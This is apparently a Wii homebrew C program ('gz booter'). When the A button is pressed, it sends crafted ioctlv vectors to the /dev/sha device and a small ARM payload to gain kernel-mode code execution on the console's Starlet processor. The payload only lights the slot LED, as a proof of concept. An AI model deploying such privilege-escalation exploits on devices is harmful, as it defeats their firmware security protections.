#include <stdio.h>
#include <stdlib.h>

#include <gccore.h>
#include <ogc/ipc.h>

static void* xfb = NULL;
static GXRModeObj* rmode = NULL;

// Performs an IOS exploit to gain code execution on Starlet in kernel mode. See
// https://github.com/mkwcat/saoirse/blob/9287a1024fcdd8a02a7f88305fb7942bfd3ac0d3/channel/Main/IOSBoot.cpp#L86
// for details.
void do_exploit(void) {
    s32 fd = IOS_Open("/dev/sha", 0);
    if (fd < 0) {
        printf("IOS_Open failed: %d\n", fd);
        return;
    }

    u32* mem1 = (u32*)0x80000000;
    mem1[0] = 0x49014A02; // ldr r1, [pc, #4]; ldr r2, [pc, #8];
    mem1[1] = 0x600AE7FB; // str r2, [r1, #0]; b.n 0
    mem1[2] = 0x0D8000C0; // HW_GPIOB_OUT
    mem1[3] = 0x00008020; // SLOT_LED (and AVE_SDA)

    ioctlv vec[3];
    vec[0].data = (void*)0x00000000;
    vec[0].len = 0;
    vec[1].data = (void*)0xFFFE0028;
    vec[1].len = 0;
    vec[2].data = (void*)0x80000000;
    vec[2].len = 32;

    s32 result = IOS_Ioctlv(fd, 0, 1, 2, vec);
    if (result < 0) {
        printf("IOS_Ioctlv failed: %d\n", result);
        return;
    }

    // Wait forever; IOS will restart Broadway
    while (true) {
        VIDEO_WaitVSync();
    }
}

int main(int argc, char* argv[]) {
    VIDEO_Init();

    rmode = VIDEO_GetPreferredMode(NULL);
    xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

    VIDEO_Configure(rmode);
    VIDEO_SetNextFramebuffer(xfb);
    VIDEO_SetBlack(false);
    VIDEO_Flush();

    VIDEO_WaitVSync();
    if (rmode->viTVMode & VI_NON_INTERLACE) {
        VIDEO_WaitVSync();
    }

    CON_Init(xfb, 20, 20, rmode->fbWidth, rmode->xfbHeight, rmode->fbWidth * VI_DISPLAY_PIX_SZ);
    CON_EnableGecko(1, 0);

    PAD_Init();

    printf("gz booter has started\n");

    while (true) {
        PAD_ScanPads();

        u16 buttons = PAD_ButtonsDown(0);
        if (buttons & PAD_BUTTON_A) {
            printf("A button pressed, performing exploit\n");
            do_exploit();
        }

        VIDEO_WaitVSync();
    }

    return 0;
}
